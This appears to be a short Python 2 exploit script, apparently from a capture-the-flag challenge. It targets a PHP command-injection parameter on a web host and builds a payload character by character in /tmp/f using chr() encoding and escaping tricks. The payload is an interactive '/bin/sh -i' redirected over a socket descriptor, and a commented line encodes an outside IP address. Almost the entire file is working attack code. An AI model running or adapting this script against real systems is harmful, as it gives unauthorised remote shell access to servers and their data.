#!/usr/bin/python

import sys
import requests

def encode(data):
    d = ''
    for c in data:
        d += 'chr(%d).' % ord(c)
    return d[:-1]


def write(c):
    if c in ['(',')']:
        c = '\\' + c
    elif c == '.':
        c = '\\56'
    
    url = "http://l4w.pw/%%F0%%9F%%A4%%94/?%%E2%%81%%A3=die(`ech\\157%%20-n%%20%s%%20>>/tmp/f`);" % c
    
    if c == '\\56':
        url = "http://l4w.pw/%F0%9F%A4%94/?%E2%81%A3=die(`cat%20/tmp/p>>/tmp/f`);" # previously creating /tmp/p containing a dot
    
    print "Writing '%s'" % url
    r = requests.get(url)
    
    if r.status_code != 200:
        print "Failed"
        sys.exit(1)


#data = encode('188.165.211.36')
data = encode('/bin/sh -i <&3 >&3 2>&3')
for c in data:
    write(c)